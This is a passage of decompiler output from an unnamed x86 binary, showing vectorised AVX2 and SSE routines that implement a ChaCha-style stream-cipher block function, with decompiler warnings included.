      vpshufb ymm1, ymm0, ymm4
      vpxor   ymm0, ymm3, ymmword ptr [ebp-0E0h]
      vpaddd  ymm3, ymm7, ymmword ptr [ebp-140h]
      vpshufb ymm0, ymm0, ymm4
      vpaddd  ymm4, ymm0, ymmword ptr [ebp-1A0h]
      vpaddd  ymm2, ymm6, ymmword ptr [ebp-120h]
      vmovdqu ymmword ptr [ebp-240h], ymm0
      vmovdqu ymmword ptr [ebp-1C0h], ymm1
      vpaddd  ymm1, ymm1, ymmword ptr [ebp-200h]
      vpxor   ymm0, ymm2, ymm5
      vpxor   ymm2, ymm3, ymmword ptr [ebp-20h]
      vpxor   ymm3, ymm1, ymmword ptr [ebp-0C0h]
      vmovdqu ymmword ptr [ebp-0E0h], ymm1
      vpslld  ymm1, ymm0, 0Ch
      vpsrld  ymm0, ymm0, 14h
      vpor    ymm5, ymm0, ymm1
      vmovdqu ymmword ptr [ebp-260h], ymm4
      vpxor   ymm4, ymm4, ymmword ptr [ebp-40h]
      vpslld  ymm1, ymm2, 0Ch
      vpsrld  ymm0, ymm2, 14h
      vpor    ymm2, ymm0, ymm1
      vpslld  ymm1, ymm3, 0Ch
      vpsrld  ymm0, ymm3, 14h
      vpor    ymm3, ymm0, ymm1
      vpsrld  ymm0, ymm4, 14h
      vpslld  ymm1, ymm4, 0Ch
      vmovdqu ymm4, ymmword ptr [ebp-1E0h]
      vpor    ymm1, ymm0, ymm1
      vpaddd  ymm0, ymm4, ymmword ptr [ebp-100h]
      vpaddd  ymm4, ymm5, ymm0
      vmovdqu ymmword ptr [ebp-180h], ymm7
      vmovdqu ymm7, ymmword ptr [ebp-60h]
      vpaddd  ymm0, ymm7, ymmword ptr [ebp-20h]
      vmovdqu ymm7, ymmword ptr [ebp-180h]
      vpaddd  ymm0, ymm2, ymm0
      vmovdqu ymmword ptr [ebp-60h], ymm0
      vmovdqu ymmword ptr [ebp-1A0h], ymm4
      vmovdqu ymm4, ymmword ptr [ebp-80h]
      vpaddd  ymm0, ymm4, ymmword ptr [ebp-0C0h]
      vmovdqu ymm4, ymmword ptr [ebp-160h]
      vpaddd  ymm0, ymm3, ymm0
      vmovdqu ymmword ptr [ebp-80h], ymm0
      vpaddd  ymm0, ymm4, ymmword ptr [ebp-40h]
      vpaddd  ymm0, ymm1, ymm0
      vmovdqu ymmword ptr [ebp-40h], ymm0
      vpxor   ymm0, ymm6, ymmword ptr [ebp-1A0h]
      vpshufb ymm4, ymm0, ds:ymmword_42BD20
      vpxor   ymm0, ymm7, ymmword ptr [ebp-60h]
      vpshufb ymm0, ymm0, ds:ymmword_42BD20
      vmovdqu ymm7, ymmword ptr [ebp-180h]
      vmovdqu ymmword ptr [ebp-0A0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-1C0h]
      vpxor   ymm0, ymm0, ymmword ptr [ebp-80h]
      vpshufb ymm0, ymm0, ds:ymmword_42BD20
      vmovdqu ymmword ptr [ebp-1C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-240h]
      vpxor   ymm0, ymm0, ymmword ptr [ebp-40h]
      vpshufb ymm0, ymm0, ds:ymmword_42BD20
      vmovdqu ymmword ptr [ebp-220h], ymm0
      vpaddd  ymm0, ymm6, ymmword ptr [ebp-120h]
      vmovdqu ymm6, ymmword ptr [ebp-0A0h]
      vmovdqu ymmword ptr [ebp-160h], ymm4
      vpaddd  ymm4, ymm4, ymm0
      vpaddd  ymm0, ymm7, ymmword ptr [ebp-140h]
      vmovdqu ymm7, ymmword ptr [ebp-1C0h]
      vpaddd  ymm0, ymm0, ymm6
      vmovdqu ymmword ptr [ebp-180h], ymm0
      vpaddd  ymm0, ymm7, ymmword ptr [ebp-0E0h]
      vmovdqu ymmword ptr [ebp-1C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-220h]
      vmovdqu ymmword ptr [ebp-200h], ymm4
      vpaddd  ymm0, ymm0, ymmword ptr [ebp-260h]
      vpaddd  ymm4, ymm7, ymmword ptr [ebp-0E0h]
      vmovdqu ymmword ptr [ebp-0A0h], ymm0
      vpxor   ymm0, ymm5, ymmword ptr [ebp-200h]
      vpxor   ymm2, ymm2, ymmword ptr [ebp-180h]
      vpxor   ymm3, ymm4, ymm3
      vpxor   ymm4, ymm1, ymmword ptr [ebp-0A0h]
      vpslld  ymm1, ymm0, 7
      vpsrld  ymm0, ymm0, 19h
      vpor    ymm0, ymm0, ymm1
      vpshufd ymm5, ymm0, 39h ; '9'
      vpslld  ymm1, ymm2, 7
      vpsrld  ymm0, ymm2, 19h
      vpor    ymm0, ymm0, ymm1
      vpshufd ymm2, ymm0, 39h ; '9'
      vpslld  ymm1, ymm3, 7
      vpsrld  ymm0, ymm3, 19h
      vpor    ymm0, ymm0, ymm1
      vpshufd ymm3, ymm0, 39h ; '9'
      vpslld  ymm1, ymm4, 7
      vpsrld  ymm0, ymm4, 19h
      vpor    ymm0, ymm0, ymm1
      vpaddd  ymm4, ymm5, ymmword ptr [ebp-1A0h]
      vpshufd ymm1, ymm0, 39h ; '9'
      vpaddd  ymm0, ymm2, ymmword ptr [ebp-60h]
      vmovdqu ymmword ptr [ebp-140h], ymm0
      vpaddd  ymm0, ymm3, ymmword ptr [ebp-80h]
      vmovdqu ymmword ptr [ebp-120h], ymm0
      vpaddd  ymm0, ymm1, ymmword ptr [ebp-40h]
      vmovdqu ymmword ptr [ebp-100h], ymm0
      vpshufd ymm0, ymmword ptr [ebp-160h], 93h
      vpxor   ymm0, ymm0, ymm4
      vpshufb ymm0, ymm0, ds:ymmword_42BD00
      vmovdqu ymmword ptr [ebp-0E0h], ymm0
      vmovdqu ymmword ptr [ebp-260h], ymm4
      vpaddd  ymm4, ymm2, ymmword ptr [ebp-60h]
      vpshufd ymm0, ymm6, 93h
      vpxor   ymm0, ymm0, ymm4
      vpshufb ymm0, ymm0, ds:ymmword_42BD00
      vpaddd  ymm4, ymm3, ymmword ptr [ebp-80h]
      vmovdqu ymmword ptr [ebp-1A0h], ymm0
      vpshufd ymm0, ymm7, 93h
      vpxor   ymm0, ymm0, ymm4
      vpshufb ymm6, ymm0, ds:ymmword_42BD00
      vpaddd  ymm4, ymm1, ymmword ptr [ebp-40h]
      vpshufd ymm0, ymmword ptr [ebp-220h], 93h
      vpxor   ymm0, ymm0, ymm4
      vpshufb ymm4, ymm0, ds:ymmword_42BD00
      vpshufd ymm0, ymmword ptr [ebp-200h], 4Eh ; 'N'
      vpaddd  ymm0, ymm0, ymmword ptr [ebp-0E0h]
      vmovdqu ymmword ptr [ebp-220h], ymm0
      vpshufd ymm0, ymmword ptr [ebp-180h], 4Eh ; 'N'
      vpaddd  ymm7, ymm0, ymmword ptr [ebp-1A0h]
      vpshufd ymm0, ymmword ptr [ebp-1C0h], 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-0C0h], ymm6
      vpaddd  ymm6, ymm0, ymm6
      vpshufd ymm0, ymmword ptr [ebp-0A0h], 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-40h], ymm4
      vpaddd  ymm4, ymm0, ymm4
      vpxor   ymm0, ymm5, ymmword ptr [ebp-220h]
      vmovdqu ymmword ptr [ebp-240h], ymm4
      vpxor   ymm4, ymm4, ymm1
      vpslld  ymm1, ymm0, 0Ch
      vpsrld  ymm0, ymm0, 14h
      vpxor   ymm2, ymm7, ymm2
      vmovdqu ymmword ptr [ebp-180h], ymm7
      vpor    ymm7, ymm0, ymm1
      vpslld  ymm1, ymm2, 0Ch
      vpsrld  ymm0, ymm2, 14h
      vpor    ymm5, ymm0, ymm1
      vpxor   ymm3, ymm6, ymm3
      vpslld  ymm1, ymm3, 0Ch
      vpsrld  ymm0, ymm3, 14h
      vpor    ymm2, ymm0, ymm1
      vpslld  ymm1, ymm4, 0Ch
      vpsrld  ymm0, ymm4, 14h
      vmovdqu ymmword ptr [ebp-200h], ymm6
      vmovdqu ymmword ptr [ebp-0A0h], ymm7
      vmovdqu ymmword ptr [ebp-20h], ymm5
      vmovdqu ymmword ptr [ebp-1C0h], ymm2
      vpor    ymm6, ymm0, ymm1
      vpaddd  ymm1, ymm7, ymmword ptr [ebp-260h]
      vpxor   ymm0, ymm1, ymmword ptr [ebp-0E0h]
      vpaddd  ymm4, ymm5, ymmword ptr [ebp-140h]
      vmovdqu ymm3, ds:ymmword_42BD20
      vpaddd  ymm2, ymm2, ymmword ptr [ebp-120h]
      vpaddd  ymm5, ymm6, ymmword ptr [ebp-100h]
      vpshufb ymm7, ymm0, ymm3
      vpxor   ymm0, ymm4, ymmword ptr [ebp-1A0h]
      vmovdqu ymmword ptr [ebp-1E0h], ymm1
      vpshufb ymm1, ymm0, ymm3
      vpxor   ymm0, ymm2, ymmword ptr [ebp-0C0h]
      vmovdqu ymmword ptr [ebp-260h], ymm1
      vmovdqu ymmword ptr [ebp-80h], ymm2
      vpshufb ymm2, ymm0, ymm3
      vpxor   ymm0, ymm5, ymmword ptr [ebp-40h]
      vpshufb ymm0, ymm0, ymm3
      vpaddd  ymm3, ymm7, ymmword ptr [ebp-220h]
      vmovdqu ymmword ptr [ebp-0E0h], ymm0
      vpxor   ymm0, ymm3, ymmword ptr [ebp-0A0h]
      vmovdqu ymmword ptr [ebp-1A0h], ymm2
      vmovdqu ymmword ptr [ebp-160h], ymm5
      vpaddd  ymm5, ymm1, ymmword ptr [ebp-180h]
      vpaddd  ymm1, ymm2, ymmword ptr [ebp-200h]
      vmovdqu ymm2, ymmword ptr [ebp-240h]
      vmovdqu ymmword ptr [ebp-60h], ymm4
      vpxor   ymm4, ymm1, ymmword ptr [ebp-1C0h]
      vpaddd  ymm1, ymm2, ymmword ptr [ebp-0E0h]
      vpxor   ymm2, ymm5, ymmword ptr [ebp-20h]
      vpxor   ymm6, ymm1, ymm6
      vpslld  ymm1, ymm0, 7
      vpsrld  ymm0, ymm0, 19h
      vpor    ymm0, ymm0, ymm1
      vpshufd ymm0, ymm0, 93h
      vmovdqu ymmword ptr [ebp-100h], ymm0
      vpshufd ymm0, ymm3, 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-120h], ymm0
      vpshufd ymm0, ymm7, 39h ; '9'
      vmovdqu ymmword ptr [ebp-0A0h], ymm0
      vpslld  ymm1, ymm2, 7
      vpsrld  ymm0, ymm2, 19h
      vpor    ymm0, ymm0, ymm1
      vpshufd ymm0, ymm0, 93h
      vmovdqu ymmword ptr [ebp-20h], ymm0
      vpshufd ymm0, ymm5, 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-140h], ymm0
      vpshufd ymm0, ymmword ptr [ebp-260h], 39h ; '9'
      vmovdqu ymmword ptr [ebp-180h], ymm0
      vmovdqu ymm7, ymmword ptr [ebp-80h]
      vpslld  ymm1, ymm4, 7
      vpsrld  ymm0, ymm4, 19h
      vpor    ymm0, ymm0, ymm1
      vmovdqu ymm1, ymmword ptr [ebp-1A0h]
      vmovdqu ymm4, ds:ymmword_42BD00
      vpshufd ymm0, ymm0, 93h
      vmovdqu ymmword ptr [ebp-0C0h], ymm0
      vpaddd  ymm0, ymm1, ymmword ptr [ebp-200h]
      vpshufd ymm0, ymm0, 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-200h], ymm0
      vpshufd ymm0, ymm1, 39h ; '9'
      vmovdqu ymmword ptr [ebp-220h], ymm0
      vpslld  ymm1, ymm6, 7
      vpsrld  ymm0, ymm6, 19h
      vmovdqu ymm6, ymmword ptr [ebp-60h]
      vpor    ymm0, ymm0, ymm1
      vmovdqu ymm1, ymmword ptr [ebp-240h]
      vpshufd ymm3, ymm0, 93h
      vpaddd  ymm0, ymm1, ymmword ptr [ebp-0E0h]
      vpshufd ymm0, ymm0, 4Eh ; 'N'
      vmovdqu ymmword ptr [ebp-1A0h], ymm0
      vpshufd ymm0, ymmword ptr [ebp-0E0h], 39h ; '9'
      vmovdqu ymmword ptr [ebp-40h], ymm3
      vmovdqu ymmword ptr [ebp-0E0h], ymm0
    }
    --v38;
  }
  while ( v38 );
  __asm
  {
    vmovdqu ymm4, ymmword ptr [ebp-300h]
    vpaddd  ymm0, ymm4, ymmword ptr [ebp-0A0h]
    vpaddd  ymm0, ymm0, ymmword ptr [ebp-320h]
    vmovdqu ymm1, ymmword ptr [ebp-2A0h]
    vmovdqu ymm2, ymmword ptr [ebp-2C0h]
    vmovdqu ymm3, ymmword ptr [ebp-2E0h]
    vmovdqu ymmword ptr [ebp-240h], ymm0
    vpaddd  ymm0, ymm1, ymmword ptr [ebp-60h]
    vmovdqu ymmword ptr [ebp-0A0h], ymm0
    vpaddd  ymm0, ymm2, ymmword ptr [ebp-20h]
    vpaddd  ymm7, ymm3, ymmword ptr [ebp-120h]
    vpaddd  ymm6, ymm2, ymmword ptr [ebp-100h]
    vmovdqu ymmword ptr [ebp-20h], ymm0
    vpaddd  ymm0, ymm3, ymmword ptr [ebp-140h]
    vmovdqu ymmword ptr [ebp-1C0h], ymm0
    vpaddd  ymm0, ymm4, ymmword ptr [ebp-180h]
    vpaddd  ymm0, ymm0, ymmword ptr [ebp-340h]
    vpaddd  ymm5, ymm1, ymmword ptr [ebp-1E0h]
    vmovdqu ymmword ptr [ebp-140h], ymm0
    vpaddd  ymm0, ymm1, ymmword ptr [ebp-80h]
    vmovdqu ymmword ptr [ebp-80h], ymm0
    vpaddd  ymm0, ymm2, ymmword ptr [ebp-0C0h]
    vmovdqu ymmword ptr [ebp-60h], ymm0
    vpaddd  ymm0, ymm3, ymmword ptr [ebp-200h]
    vmovdqu ymmword ptr [ebp-120h], ymm0
    vpaddd  ymm0, ymm4, ymmword ptr [ebp-220h]
    vpaddd  ymm0, ymm0, ymmword ptr [ebp-280h]
    vmovdqu ymmword ptr [ebp-100h], ymm0
    vpaddd  ymm0, ymm1, ymmword ptr [ebp-160h]
    vmovdqu ymmword ptr [ebp-160h], ymm0
    vpaddd  ymm0, ymm2, ymmword ptr [ebp-40h]
    vmovdqu ymm2, ymmword ptr [ebp-0A0h]
    vmovdqu ymmword ptr [ebp-40h], ymm0
    vpaddd  ymm0, ymm3, ymmword ptr [ebp-1A0h]
    vmovdqu ymmword ptr [ebp-1E0h], ymm0
    vpaddd  ymm0, ymm4, ymmword ptr [ebp-0E0h]
    vpaddd  ymm0, ymm0, ymmword ptr [ebp-360h]
    vmovdqu ymm4, ymmword ptr [ebp-1C0h]
    vmovdqu ymmword ptr [ebp-0C0h], ymm0
    vperm2i128 ymm0, ymm5, ymm6, 31h ; '1'
  }
  if ( a1 )
  {
    __asm
    {
      vpxor   ymm0, ymm0, ymmword ptr [edi]
      vmovdqu ymmword ptr [eax], ymm0
      vperm2i128 ymm0, ymm7, ymmword ptr [ebp-240h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+20h]
      vmovdqu ymmword ptr [eax+20h], ymm0
      vperm2i128 ymm0, ymm2, ymmword ptr [ebp-20h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+40h]
      vmovdqu ymmword ptr [eax+40h], ymm0
      vperm2i128 ymm0, ymm4, ymmword ptr [ebp-140h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+60h]
      vmovdqu ymmword ptr [eax+60h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-80h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-60h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+80h]
      vmovdqu ymmword ptr [eax+80h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-120h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-100h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+0A0h]
      vmovdqu ymmword ptr [eax+0A0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-160h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-40h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+0C0h]
      vmovdqu ymmword ptr [eax+0C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-1E0h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-0C0h], 31h ; '1'
      vpxor   ymm0, ymm0, ymmword ptr [edi+0E0h]
      vmovdqu ymmword ptr [eax+0E0h], ymm0
      vperm2i128 ymm0, ymm5, ymm6, 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+100h]
      vmovdqu ymmword ptr [eax+100h], ymm0
      vperm2i128 ymm0, ymm7, ymmword ptr [ebp-240h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+120h]
      vmovdqu ymmword ptr [eax+120h], ymm0
      vperm2i128 ymm0, ymm2, ymmword ptr [ebp-20h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+140h]
      vmovdqu ymmword ptr [eax+140h], ymm0
      vperm2i128 ymm0, ymm4, ymmword ptr [ebp-140h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+160h]
      vmovdqu ymmword ptr [eax+160h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-80h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-60h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+180h]
      vmovdqu ymmword ptr [eax+180h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-120h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-100h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+1A0h]
      vmovdqu ymmword ptr [eax+1A0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-160h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-40h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+1C0h]
      vmovdqu ymmword ptr [eax+1C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-1E0h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-0C0h], 20h ; ' '
      vpxor   ymm0, ymm0, ymmword ptr [edi+1E0h]
      vmovdqu ymmword ptr [eax+1E0h], ymm0
      vzeroupper
    }
  }
  else
  {
    __asm
    {
      vmovdqu ymmword ptr [eax], ymm0
      vperm2i128 ymm0, ymm7, ymmword ptr [ebp-240h], 31h ; '1'
      vmovdqu ymmword ptr [eax+20h], ymm0
      vperm2i128 ymm0, ymm2, ymmword ptr [ebp-20h], 31h ; '1'
      vmovdqu ymmword ptr [eax+40h], ymm0
      vperm2i128 ymm0, ymm4, ymmword ptr [ebp-140h], 31h ; '1'
      vmovdqu ymmword ptr [eax+60h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-80h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-60h], 31h ; '1'
      vmovdqu ymmword ptr [eax+80h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-120h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-100h], 31h ; '1'
      vmovdqu ymmword ptr [eax+0A0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-160h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-40h], 31h ; '1'
      vmovdqu ymmword ptr [eax+0C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-1E0h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-0C0h], 31h ; '1'
      vmovdqu ymmword ptr [eax+0E0h], ymm0
      vperm2i128 ymm0, ymm5, ymm6, 20h ; ' '
      vmovdqu ymmword ptr [eax+100h], ymm0
      vperm2i128 ymm0, ymm7, ymmword ptr [ebp-240h], 20h ; ' '
      vmovdqu ymmword ptr [eax+120h], ymm0
      vperm2i128 ymm0, ymm2, ymmword ptr [ebp-20h], 20h ; ' '
      vmovdqu ymmword ptr [eax+140h], ymm0
      vperm2i128 ymm0, ymm4, ymmword ptr [ebp-140h], 20h ; ' '
      vmovdqu ymmword ptr [eax+160h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-80h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-60h], 20h ; ' '
      vmovdqu ymmword ptr [eax+180h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-120h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-100h], 20h ; ' '
      vmovdqu ymmword ptr [eax+1A0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-160h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-40h], 20h ; ' '
      vmovdqu ymmword ptr [eax+1C0h], ymm0
      vmovdqu ymm0, ymmword ptr [ebp-1E0h]
      vperm2i128 ymm0, ymm0, ymmword ptr [ebp-0C0h], 20h ; ' '
      vmovdqu ymmword ptr [eax+1E0h], ymm0
      vzeroupper
    }
  }
  return result;
}
// 402690: could not find valid save-restore pair for ebp
// 402690: unsupported processor register 'ymm4'

//----- (00403260) --------------------------------------------------------
__m128i *__usercall sub_403260@<eax>(__m128i *a1@<edx>, __m128i *a2@<ecx>, __m128i *a3)
{
  int v3; // eax
  __m128i v4; // xmm7
  __m128i v5; // xmm5
  __m128i v6; // xmm3
  __m128i v7; // xmm4
  __m128i v8; // xmm6
  __m128i v9; // xmm7
  __m128i v10; // xmm1
  __m128i v11; // xmm2
  __m128i v12; // xmm4
  __m128i v13; // xmm5
  __m128i v14; // xmm2
  __m128i v15; // xmm5
  __m128i v16; // xmm7
  __m128i v17; // xmm4
  __m128i v18; // xmm7
  __m128i v19; // xmm4
  __m128i v20; // xmm0
  __m128i v21; // xmm5
  __m128i v22; // xmm0
  __m128i v23; // xmm2
  __m128i v24; // xmm3
  __m128i v25; // xmm6
  __m128i v26; // xmm3
  __m128i v27; // xmm3
  __m128i v28; // xmm6
  __m128i v29; // xmm2
  __m128i v30; // xmm6
  __m128i v31; // xmm1
  __m128i v32; // xmm3
  __m128i v33; // xmm4
  __m128i v34; // xmm7
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm1
  __m128i v38; // xmm2
  __m128i v39; // xmm3
  __m128i v40; // xmm6
  __m128i v41; // xmm1
  __m128i v42; // xmm0
  __m128i v43; // xmm6
  __m128i v44; // xmm5
  __m128i v45; // xmm3
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm4
  __m128i v49; // xmm6
  __m128i v50; // xmm3
  __m128i v51; // xmm2
  __m128i v52; // xmm5
  __m128i v53; // xmm0
  __m128i v54; // xmm2
  __m128i v55; // xmm3
  __m128i v56; // xmm4
  __m128i v57; // xmm5
  __m128i v58; // xmm3
  __m128i v59; // xmm7
  __m128i v60; // xmm1
  __m128i v61; // xmm4
  __m128i v62; // xmm6
  __m128i v63; // xmm2
  __m128i v64; // xmm0
  __m128i v65; // xmm5
  __m128i v66; // xmm7
  __m128i v67; // xmm3
  __m128i v68; // xmm4
  __m128i *result; // eax
  __m128i v70; // [esp-180h] [ebp-18Ch]
  __m128i v71; // [esp-170h] [ebp-17Ch]
  __m128i v72; // [esp-160h] [ebp-16Ch]
  __m128i v73; // [esp-150h] [ebp-15Ch]
  __m128i v74; // [esp-150h] [ebp-15Ch]
  __m128i v75; // [esp-140h] [ebp-14Ch]
  __m128i v76; // [esp-130h] [ebp-13Ch]
  __m128i v77; // [esp-120h] [ebp-12Ch]
  __m128i v78; // [esp-120h] [ebp-12Ch]
  __m128i v79; // [esp-120h] [ebp-12Ch]
  __m128i v80; // [esp-110h] [ebp-11Ch]
  __m128i v81; // [esp-110h] [ebp-11Ch]
  __m128i v82; // [esp-110h] [ebp-11Ch]
  __m128i v83; // [esp-100h] [ebp-10Ch]
  __m128i v84; // [esp-100h] [ebp-10Ch]
  __m128i v85; // [esp-100h] [ebp-10Ch]
  __m128i v86; // [esp-F0h] [ebp-FCh]
  __m128i v87; // [esp-F0h] [ebp-FCh]
  __m128i v88; // [esp-E0h] [ebp-ECh]
  __m128i v89; // [esp-E0h] [ebp-ECh]
  __m128i v90; // [esp-E0h] [ebp-ECh]
  __m128i v91; // [esp-D0h] [ebp-DCh]
  __m128i v92; // [esp-D0h] [ebp-DCh]
  __m128i v93; // [esp-D0h] [ebp-DCh]
  __m128i v94; // [esp-D0h] [ebp-DCh]
  __m128i v95; // [esp-C0h] [ebp-CCh]
  __m128i v96; // [esp-C0h] [ebp-CCh]
  __m128i v97; // [esp-C0h] [ebp-CCh]
  __m128i v98; // [esp-B0h] [ebp-BCh]
  __m128i v99; // [esp-B0h] [ebp-BCh]
  __m128i v100; // [esp-B0h] [ebp-BCh]
  __m128i v101; // [esp-A0h] [ebp-ACh]
  __m128i v102; // [esp-A0h] [ebp-ACh]
  __m128i v103; // [esp-A0h] [ebp-ACh]
  __m128i v104; // [esp-90h] [ebp-9Ch]
  __m128i v105; // [esp-90h] [ebp-9Ch]
  __m128i v106; // [esp-90h] [ebp-9Ch]
  __m128i v107; // [esp-80h] [ebp-8Ch]
  __m128i v108; // [esp-80h] [ebp-8Ch]
  __m128i v109; // [esp-80h] [ebp-8Ch]
  __m128i v110; // [esp-70h] [ebp-7Ch]
  __m128i v111; // [esp-70h] [ebp-7Ch]
  __m128i v112; // [esp-70h] [ebp-7Ch]
  __m128i v113; // [esp-70h] [ebp-7Ch]
  __m128i v114; // [esp-60h] [ebp-6Ch]
  __m128i v115; // [esp-60h] [ebp-6Ch]
  __m128i v116; // [esp-60h] [ebp-6Ch]
  __m128i v117; // [esp-60h] [ebp-6Ch]
  __m128i v118; // [esp-50h] [ebp-5Ch]
  __m128i v119; // [esp-50h] [ebp-5Ch]
  __m128i v120; // [esp-50h] [ebp-5Ch]
  __m128i v121; // [esp-50h] [ebp-5Ch]
  __m128i v122; // [esp-40h] [ebp-4Ch]
  __m128i v123; // [esp-40h] [ebp-4Ch]
  __m128i v124; // [esp-40h] [ebp-4Ch]
  __m128i v125; // [esp-40h] [ebp-4Ch]
  __m128i v126; // [esp-30h] [ebp-3Ch]
  __m128i v127; // [esp-30h] [ebp-3Ch]
  __m128i v128; // [esp-30h] [ebp-3Ch]
  __m128i v129; // [esp-30h] [ebp-3Ch]
  __m128i v130; // [esp-30h] [ebp-3Ch]
  __m128i v131; // [esp-20h] [ebp-2Ch]
  __m128i v132; // [esp-20h] [ebp-2Ch]
  __m128i v133; // [esp-20h] [ebp-2Ch]
  __m128i v134; // [esp-20h] [ebp-2Ch]
  __m128i v135; // [esp-20h] [ebp-2Ch]
  __m128i v136; // [esp-10h] [ebp-1Ch]
  __m128i v137; // [esp-10h] [ebp-1Ch]
  __m128i v138; // [esp-10h] [ebp-1Ch]
  __m128i v139; // [esp-10h] [ebp-1Ch]
  __m128i v140; // [esp-10h] [ebp-1Ch]

  v3 = 4;
  v4 = a2[3];
  v5 = _mm_add_epi64((__m128i)xmmword_42BC80, v4);
  v6 = _mm_add_epi64((__m128i)xmmword_42BC90, v4);
  v75 = *a2;
  v7 = _mm_add_epi64((__m128i)xmmword_42BCA0, v4);
  v76 = a2[1];
  v71 = a2[2];
  v70 = v4;
  v95 = *a2;
  v104 = v76;
  v107 = v71;
  v131 = *a2;
  v101 = v76;
  v122 = v71;
  v126 = *a2;
  v98 = v76;
  v118 = v71;
  v136 = *a2;
  v110 = v76;
  v114 = v71;
  while ( 1 )
  {
    v8 = _mm_add_epi32(v104, v95);
    v9 = _mm_xor_si128(v4, v8);
    v10 = _mm_add_epi32(v98, v126);
    v11 = _mm_add_epi32(v110, v136);
    v12 = _mm_xor_si128(v7, v11);
    v132 = _mm_add_epi32(v101, v131);
    v13 = _mm_xor_si128(v5, v132);
    v96 = v11;
    v14 = _mm_xor_si128(v6, v10);
    v127 = _mm_or_si128(_mm_slli_epi32(v14, 0x10u), _mm_srli_epi32(v14, 0x10u));
    v91 = _mm_or_si128(_mm_slli_epi32(v13, 0x10u), _mm_srli_epi32(v13, 0x10u));
    v83 = _mm_or_si128(_mm_slli_epi32(v9, 0x10u), _mm_srli_epi32(v9, 0x10u));
    v88 = _mm_add_epi32(v91, v122);
    v108 = _mm_add_epi32(v83, v107);
    v15 = _mm_xor_si128(v88, v101);
    v80 = _mm_add_epi32(v127, v118);
    v16 = _mm_xor_si128(v108, v104);
    v137 = _mm_or_si128(_mm_slli_epi32(v12, 0x10u), _mm_srli_epi32(v12, 0x10u));
    v17 = _mm_xor_si128(v80, v98);
    v77 = _mm_add_epi32(v137, v114);
    v18 = _mm_or_si128(_mm_srli_epi32(v16, 0x14u), _mm_slli_epi32(v16, 0xCu));
    v19 = _mm_or_si128(_mm_srli_epi32(v17, 0x14u), _mm_slli_epi32(v17, 0xCu));
    v20 = _mm_xor_si128(v77, v110);
    v21 = _mm_or_si128(_mm_srli_epi32(v15, 0x14u), _mm_slli_epi32(v15, 0xCu));
    v115 = _mm_add_epi32(v19, v10);
    v22 = _mm_or_si128(_mm_srli_epi32(v20, 0x14u), _mm_slli_epi32(v20, 0xCu));
    v23 = _mm_add_epi32(v18, v8);
    v24 = _mm_add_epi32(v21, v132);
    v119 = _mm_add_epi32(v22, v96);
    v25 = _mm_xor_si128(v91, v24);
    v111 = v23;
    v133 = v24;
    v128 = _mm_xor_si128(v127, v115);
    v26 = _mm_xor_si128(v83, v23);
    v138 = _mm_xor_si128(v137, v119);
    v123 = _mm_or_si128(_mm_srli_epi32(v26, 0x18u), _mm_slli_epi32(v26, 8u));
    v27 = _mm_slli_epi32(v138, 8u);
    v92 = _mm_or_si128(_mm_srli_epi32(v25, 0x18u), _mm_slli_epi32(v25, 8u));
    v28 = v138;
    v84 = _mm_or_si128(_mm_srli_epi32(v128, 0x18u), _mm_slli_epi32(v128, 8u));
    v139 = _mm_add_epi32(v84, v80);
    v89 = _mm_add_epi32(v92, v88);
    v29 = _mm_xor_si128(v89, v21);
    v30 = _mm_or_si128(_mm_srli_epi32(v28, 0x18u), v27);
    v129 = _mm_add_epi32(v30, v77);
